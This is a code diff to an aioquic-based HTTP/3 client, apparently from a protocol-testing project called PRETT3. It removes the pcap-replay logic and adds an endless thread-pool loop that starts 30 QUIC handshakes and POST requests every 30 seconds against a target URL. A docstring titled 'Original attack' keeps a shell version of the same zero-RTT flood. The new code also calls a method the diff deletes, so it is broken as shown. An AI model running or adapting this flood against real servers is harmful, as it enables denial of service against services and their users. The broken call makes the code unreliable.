@@ -25,14 +25,13 @@ from aioquic.quic.logger import QuicFileLogger
 from aioquic.quic.connection import QuicConnection, QuicNetworkPath
 from aioquic.tls import CipherSuite, Epoch
 
-import util  # PRETT3 project module
 import aioquic.tls as tls
 from aioquic.quic.connection import *
+import concurrent.futures
 
 logger = logging.getLogger("client")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.settimeout(0.1)
-
 
 class HttpClient():
     def __init__(self, quic_conf: QuicConfiguration, hostname: str) -> None:
@@ -44,154 +43,13 @@ class HttpClient():
         self.network_path = QuicNetworkPath(hostname)
         self._quic = QuicConnection(configuration=self.quic_conf)
         self._http = H3Connection(self._quic)
-        
     
-    def send_quic_packet(self, packet):
-        """
-        Reconstruct and send a QUIC packet based on its frame type.
-        Handles three key QUIC packet types:
-        1. 1-RTT(ACK)
-        2. 1-RTT(STREAM) H3(SETTINGS)
-        3. 1-RTT(STREAM) H3(HEADERS)
-        """
-        try:
-            # Determine the QUIC frame type from the hex value
-            if hasattr(packet.quic, 'frame_type'):
-                frame_type_hex = int(packet.quic.frame_type, 16)  # Convert hex to int
-                
-                # Look up the frame type in QUIC_FRAMETYPE list
-                if frame_type_hex < len(util.QUIC_FRAMETYPE):
-                    quic_frame_type_name = util.QUIC_FRAMETYPE[frame_type_hex]
-                    print(f"\033[92mReplaying 1-RTT({quic_frame_type_name}) QUIC packet\033[0m")
-                    
-                    # Handle ACK or STREAM frames based on frame type
-                    if quic_frame_type_name == 'ACK':
-                        quic_frame_type = QuicFrameType.ACK
-                        quic_payload = b''  # ACK does not need a payload
-
-                    elif 'STREAM' in quic_frame_type_name:
-                        quic_frame_type = QuicFrameType.STREAM_BASE
-                        
-                        # HTTP/3 layer processing
-                        if hasattr(packet, 'http3'):
-                            h3_layer = packet.http3
-
-                            # Check for H3 SETTINGS frame
-                            if hasattr(h3_layer, 'frame_type'):
-                                h3_frame_type_hex = int(h3_layer.frame_type, 16)  # Convert hex to int
-
-                                if h3_frame_type_hex < len(util.H3_FRAMETYPE):
-                                    h3_frame_type_name = util.H3_FRAMETYPE[h3_frame_type_hex]
-
-                                    if h3_frame_type_name == 'SETTINGS':
-                                        print(f"\033[92mReplaying H3(SETTINGS) frame\033[0m")
-                                        quic_payload = self.build_h3_settings_frame(h3_layer)
-
-                                    elif h3_frame_type_name == 'HEADERS':
-                                        print(f"\033[92mReplaying H3(HEADERS) frame\033[0m")
-                                        quic_payload = self.build_h3_headers_frame(h3_layer)
-
-                                    else:
-                                        print(f"\033[93mUnknown H3 frame type: {h3_frame_type_name}, skipping...\033[0m")
-                                        return
-                                else:
-                                    print(f"\033[93mInvalid H3 frame type index: {h3_frame_type_hex}, skipping...\033[0m")
-                                    return
-                        else:
-                            print("\033[93mNo H3 layer found in STREAM packet, skipping...\033[0m")
-                            return
-                    else:
-                        print(f"\033[93mUnsupported QUIC frame type: {quic_frame_type_name}, skipping...\033[0m")
-                        return
-                else:
-                    print(f"\033[93mInvalid QUIC frame type index: {frame_type_hex}, skipping...\033[0m")
-                    return
-            else:
-                print(f"[-] Frame type not found, skipping packet...")
-                return
-
-            # Create a new builder for each packet
-            builder = self.get_builder(Epoch.ONE_RTT)
-
-            # Add the payload to the builder with the determined frame type
-            buf = builder.start_frame(quic_frame_type, capacity=len(quic_payload))
-            buf.push_bytes(quic_payload)
-
-            # Flush the builder and send the packet
-            self.send_quic_frames_from_builder(builder)
-            print("QUIC packet replayed successfully.")
-
-        except Exception as e:
-            print(f"[-] send_quic_packet(): An error occurred: {e}")
-            traceback.print_exc()  # Print detailed traceback information
-
-    def build_h3_settings_frame(self, h3_layer):
-        """
-        Builds and returns a SETTINGS frame for the H3 layer
-        """
-        settings_data = bytes.fromhex(h3_layer.payload.raw_value)
-        return aioquic.h3.connection.encode_frame(FrameType.SETTINGS, settings_data)
-
     def build_h3_headers_frame(self, h3_layer):
         """
         Builds and returns a HEADERS frame for the H3 layer
         """
         headers_data = bytes.fromhex(h3_layer.payload.raw_value)
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, headers_data)
-
-    def send_quic_stream(self, frame_data, stream_id):
-        """
-        Function to send frame_data over the QUIC stream.
-        Uses the stream_id from h3msg to send over the same stream.
-        """
-        builder = self.get_builder(Epoch.ONE_RTT)
-
-        buf = builder.start_frame(
-            QuicFrameType.STREAM_BASE | 2,
-            capacity=4,  # Capacity setting for stream transmission
-        )
-
-        # Use the extracted stream_id
-        buf.push_uint_var(stream_id)  # Use the stream_id extracted from h3msg
-
-        buf.push_uint16(len(frame_data) | 0x4000)  # Set the length of the data
-        buf.push_bytes(frame_data)  # Add the actual frame data to the stream
-
-        # Send the packet
-        self.send_quic_frames_from_builder(builder)
-
-    def replay_sample_msg(self, h3msg):
-        """
-        Function to replay QUIC and HTTP/3 packets from h3msg.
-        Uses the same stream_id from the h3msg for QUIC stream transmission.
-        """
-        for layer in h3msg.layers:
-            if layer.layer_name == 'quic':
-                # Process QUIC packet
-                self.send_quic_packet(h3msg)
-
-            elif layer.layer_name == 'http3':
-                # Process HTTP/3 packet
-
-                # 1. Extract stream_id from the HTTP/3 layer
-                stream_id_value = layer.get_field_value("http3.stream_id", raw=True)
-                if stream_id_value is None:
-                    print("No stream_id found in the HTTP/3 packet, skipping...")
-                    continue  # Skip this message if there's no stream_id
-
-                stream_id = int(stream_id_value)
-
-                # 2. Extract frame type
-                h3_field_type = int(layer.get_field_value("http3.frame_type", raw=True))
-                
-                # 3. Extract frame payload
-                h3_field_payload = bytes.fromhex(layer.get_field_value("http3.frame_payload", raw=True))
-                
-                # 4. Rebuild the HTTP/3 frame
-                frame_data = aioquic.h3.connection.encode_frame(h3_field_type, h3_field_payload)
-                
-                # 5. Send the frame over the QUIC stream using the extracted stream_id
-                self.send_quic_stream(frame_data, stream_id)
 
     def craft_sample_headers_frame(self):
         """
@@ -202,19 +60,27 @@ class HttpClient():
         stream_id = self._quic.get_next_available_stream_id()
 
         headers = [
-                (b":method", "GET".encode()),
+                (b":method", "POST".encode()),
                 (b":scheme", "HTTPS".encode()),
                 (b":authority", self.hostname.encode()),
-                (b":path", "/".encode()),
-                (b"user-agent", "PRETT3 client".encode()),
+                (b":path", "/600k.html".encode()),
+                (b"user-agent", "PRETT3 client".encode())
             ]
 
         frame_data =  self._http._encode_headers(stream_id, headers)
 
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data)
+    
+    def craft_sample_data_frame(self):
+        """
+        Craft a sample DATA frame
+        """
+        
+        print("\nCrafting a sample DATA frame")
 
-        #self._http._quic.send_stream_data(
-        #    stream_id, aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data), False)
+        data = "A"*10
+
+        return aioquic.h3.connection.encode_frame(FrameType.DATA, data.encode())
 
 
     def get_builder(self, epoch: Epoch):
@@ -271,25 +137,6 @@ class HttpClient():
         buf.push_bytes(frame_data) # data
 
         self.send_quic_frames_from_builder(builder)
-
-    # sample
-    def send_quic_ack(self, acked_packet_num):
-        
-        builder = self.get_builder()
-
-        buf = builder.start_frame(
-                    QuicFrameType.ACK, # frame type
-                    capacity=ACK_FRAME_CAPACITY,
-                    #handler_args=(limit,),
-                )
-        
-        buf.push_uint_var(acked_packet_num) # largest acknowledged
-        buf.push_uint_var(106) # ack delay
-        buf.push_uint_var(0) # ack range count
-        buf.push_uint_var(0) # ack range
-
-        self.send_quic_frames_from_builder(builder)
-
 
     def send_quic_frames_from_builder(self, builder:QuicPacketBuilder):
         datagrams, packets = builder.flush()
@@ -919,71 +766,56 @@ class HttpClient():
                 self.receive_datagram(data, now=time.process_time())
         except socket.timeout: pass
 
+
+
+""" 
+Original attack:
+while true
+do
+    echo "\e[0;31mInitiate attack\e[0m"
+    #Or seq 1 100 | timeout 5s xargs -n1 -P100
+    sudo seq 1 30 | timeout 1s xargs -n1 -P30 python3 examples/http3_client.py --zero-rtt URL 
+    echo "\e[0;32mSleep...\e[0m"
+    sleep 30;
+done
+"""
+
+"""
+
+"""
 def main(
     configuration: QuicConfiguration,
-    url: str,
-    sample_msg: pyshark.FileCapture
+    url: str
 ) -> None:
-
-    # Step 1: Initialize the HTTP/3 client with QUIC configuration
-    h3client = HttpClient(configuration, urlparse(url).netloc)
-
-    # Step 2: Establish the initial connection (handshake)
-    print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
-    h3client.connect()
-    h3client.read_from_buffer()  # Receive any response from the server
-
-    #time.sleep(1)
-
-    # Step 3: Complete the connection (finish handshake)
-    print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
-    h3client.complete_connection()
-    h3client.read_from_buffer()  # Receive any response from the server
-
-    #time.sleep(1)
-
-    # Step 4: Replay only 1-RTT messages from sample_msg
-    print("\033[93m\n[Replaying 1-RTT messages...]\033[0m")
-
-    for msg in sample_msg:
-        try:
-            if hasattr(msg, 'quic'):
-                # Skip long header QUIC packets (identified by 'header_form' == "1")
-                if hasattr(msg.quic, 'header_form') and msg.quic.header_form == "1":
-                    print(f"\033[90mSkipping long header QUIC message: {util.h3msg_to_str(msg)}\033[0m")
-                    continue
-                
-                # Process only short header (1-RTT) QUIC packets
-                print(f"\033[92mReplaying short header (1-RTT) QUIC message: {util.h3msg_to_str(msg)}\033[0m")
-                h3client.replay_sample_msg(msg)
-                h3client.read_from_buffer()
-                time.sleep(0.1)
-            else:
-                print(f"\033[92mNo QUIC layer found in message: {util.h3msg_to_str(msg)}\033[0m")
-
-        except AttributeError:
-            print(f"\033[92mError processing message: {util.h3msg_to_str(msg)}\033[0m")
-
-
-    print("\033[93m\n[Replay completed]\033[0m")
     
-    """
-    headers_data = h3client.craft_sample_headers_frame()
-    h3client.send_quic_stream(headers_data)
-    h3client.read_from_buffer()
-    """
+    def background_task():
+        
+        # Step 1: Initialize the HTTP/3 client with QUIC configuration
+        h3client = HttpClient(configuration, urlparse(url).netloc)
 
-def init(args):
-    print("\n[STEP 1] Initializing...")
-    os.system("sudo rm -r __pycache__")
+        # Step 2: Establish the initial connection (handshake)
+        print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
+        h3client.connect()
+        h3client.read_from_buffer()  # Receive any response from the server
 
-    SERVER_ADDR = args.url
-    pcapfile = args.pcap
-    # outdir = setup_logger(pcapfile, 0)
-    # _enable_capture()
+        # Step 3: Complete the connection (finish handshake)
+        print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
+        h3client.complete_connection()
+        h3client.read_from_buffer()  # Receive any response from the server
 
-    print("  [+] Initializing done!\n    => pcap : %s, SERVER_ADDR : %s" % (pcapfile, SERVER_ADDR))
-    return
+        headers_data = h3client.craft_sample_headers_frame()
+        h3client.send_quic_stream(headers_data)
+        h3client.read_from_buffer()
+
+    #background_task()
+    #sys.exit()
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = []
+        while True:
+            for i in range(30):
+                # Submit each iteration as a separate task
+                futures.append(executor.submit(background_task))
+            time.sleep(30)
 
 
 if __name__ == "__main__":
@@ -992,9 +824,6 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="HTTP/3 client")
     parser.add_argument(
         "url", type=str, help="the URL to query (must be HTTPS)"
-    )
-    parser.add_argument(
-        "pcap", type=str, help="the PATH of QUIC or HTTP/3 traffic (must be Wireshark-readable pcap)"
     )
     parser.add_argument(
         "--ca-certs", type=str, help="load CA certificates from the specified file"
@@ -1056,13 +885,6 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    '''
-    logging.basicConfig(
-        format="%(asctime)s %(levelname)s %(name)s %(message)s",
-        level=logging.DEBUG if args.verbose else logging.INFO,
-    )
-    '''
-
     # prepare configuration
     configuration = QuicConfiguration(
         is_client=True,
@@ -1087,16 +909,10 @@ if __name__ == "__main__":
     if args.secrets_log:
         configuration.secrets_log_file = open(args.secrets_log, "a")
 
-    ### General setting ###
-    init(args)
     
-    ### Extract initial state machine ###
-    http3_basic_messages = util.h3msg_from_pcap(args.pcap, client_only=True)
-
     main(
             configuration=configuration,
-            url=args.url,
-            sample_msg = http3_basic_messages
+            url=args.url
         )
     
     
